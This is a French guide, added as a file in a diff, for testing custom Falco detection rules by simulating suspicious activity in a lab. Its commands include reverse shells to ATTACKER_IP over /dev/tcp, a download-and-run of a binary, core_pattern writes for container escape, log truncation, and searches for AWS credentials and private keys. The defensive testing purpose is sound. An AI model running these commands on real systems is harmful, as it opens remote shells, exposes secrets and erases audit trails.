@@ -1,0 +1,182 @@
+cat file_transfert.txt 
+Pour tester tes règles personnalisées Falco (comme Disallowed SSH Connection Non Standard Port ou Redirect STDOUT/STDIN to Network Connection in Container), tu dois simuler les comportements malveillants ou suspects que ces règles visent à détecter. Voici un plan précis pour tester chaque règle, avec les commandes concrètes à exécuter dans un environnement contrôlé (lab ou VM Docker/Kubernetes) :
+✅ 1. Disallowed SSH Connection Non Standard Port
+
+Objectif : Détecter une connexion SSH sortante vers un port non standard.
+💥 Simulation :
+
+ssh -p 4444 user@yourserver.com
+
+🔧 Prérequis :
+
+    Assure-toi que 4444 est bien dans la liste ssh_non_standard_ports dans tes règles.
+
+    Si besoin, tu peux lancer un serveur SSH temporaire en écoute sur ce port :
+
+sudo sshd -p 4444 -f /etc/ssh/sshd_config_test
+
+✅ Résultat attendu :
+
+    Une alerte Falco avec message :
+    Disallowed SSH Connection | connection=...
+
+✅ 2. Redirect STDOUT/STDIN to Network Connection in Container
+
+Objectif : Détecter un shell inversé dans un conteneur.
+💥 Simulation (reverse shell vers netcat listener) :
+
+Sur ton attacker machine (listener) :
+
+nc -lvp 1234
+
+Dans un conteneur cible :
+
+bash -i >& /dev/tcp/ATTACKER_IP/1234 0>&1
+
+Ou encore avec curl et bash :
+
+bash -c 'exec 5<>/dev/tcp/ATTACKER_IP/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'
+
+✅ Résultat attendu :
+
+    Falco détecte :
+    Redirect stdout/stdin to network connection | gparent=...
+
+✅ 3. Linux Kernel Module Injection Detected
+
+Objectif : Détecter l’injection de modules noyau depuis un conteneur.
+💥 Simulation (à faire en VM avec module à charger) :
+
+insmod malicious.ko
+
+Tu peux créer un module vide :
+
+// hello.c
+#include <linux/module.h>
+#include <linux/kernel.h>
+int init_module(void) { return 0; }
+void cleanup_module(void) {}
+
+Puis :
+
+make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
+insmod hello.ko
+
+Depuis un conteneur privilégié :
+
+docker run --rm -it --privileged alpine sh
+insmod hello.ko
+
+✅ 4. Debugfs Launched in Privileged Container
+
+Objectif : Détecter lancement de debugfs dans un conteneur avec privilèges.
+💥 Simulation :
+
+docker run --rm -it --privileged debian bash
+apt update && apt install -y e2fsprogs
+debugfs /dev/sda1
+
+✅ 5. Detect release_agent File Container Escapes
+
+Objectif : Détection d'une tentative d'évasion via /proc/sys/kernel/core_pattern.
+💥 Simulation (⚠️ potentiellement dangereux) :
+
+echo "/tmp/malicious.sh" > /proc/sys/kernel/core_pattern
+
+Ou dans un conteneur :
+
+echo "/tmp/x" > /proc/sys/kernel/core_pattern
+
+✅ 6. PTRACE attached to process
+
+Objectif : Détection d’un ptrace (injection de code/debug).
+💥 Simulation :
+
+strace -p <PID>
+
+Ou avec GDB :
+
+gdb -p <PID>
+
+✅ 7. Find AWS Credentials
+
+Objectif : Détection de recherche de clés AWS.
+💥 Simulation :
+
+grep -r "aws_secret_access_key" ~/
+
+Ou :
+
+find ~/.aws/ -name credentials
+
+✅ 8. Execution from /dev/shm
+
+Objectif : Détecter l’exécution depuis /dev/shm.
+💥 Simulation :
+
+cp /bin/bash /dev/shm/bash
+chmod +x /dev/shm/bash
+/dev/shm/bash
+
+✅ 9. Drop and Execute New Binary in Container
+
+Objectif : Exécuter un binaire téléchargé dans un conteneur.
+💥 Simulation :
+
+docker run -it ubuntu bash
+curl -o /tmp/nc http://<yourserver>/nc
+chmod +x /tmp/nc
+/tmp/nc -h
+
+✅ 10. Clear Log Activities
+
+Objectif : Détection de vidage de journaux.
+💥 Simulation :
+
+truncate -s 0 /var/log/auth.log
+
+✅ 11. Remove Bulk Data from Disk
+
+Objectif : Exécution de commandes destructrices.
+💥 Simulation :
+
+shred -u /tmp/testfile
+
+✅ 12. Create Symlink Over Sensitive Files
+
+Objectif : Créer un lien symbolique vers un fichier sensible.
+💥 Simulation :
+
+ln -s /etc/shadow /tmp/shadow_link
+
+✅ 13. Packet socket created in container
+
+Objectif : Création de socket en mode AF_PACKET.
+💥 Simulation :
+
+docker run --rm -it --cap-add=NET_RAW debian bash
+apt update && apt install -y tcpdump
+tcpdump -i eth0
+
+✅ 14. Search Private Keys or Passwords
+
+Objectif : Recherche de fichiers id_rsa, etc.
+💥 Simulation :
+
+find / -name "id_rsa"
+
+📌 Comment vérifier les alertes Falco ?
+1. Via logs Falco :
+
+journalctl -u falco -f
+
+2. Si tu utilises Falcosidekick :
+
+    Check Slack / Discord / Webhook / UI selon ta config.
+
+📚 Tips finaux :
+
+    Tu peux aussi déclencher manuellement un log Falco en exécutant :
+
+falco -r /etc/falco/falco_rules.yaml -r /etc/falco/custom_rules.yaml -A
+
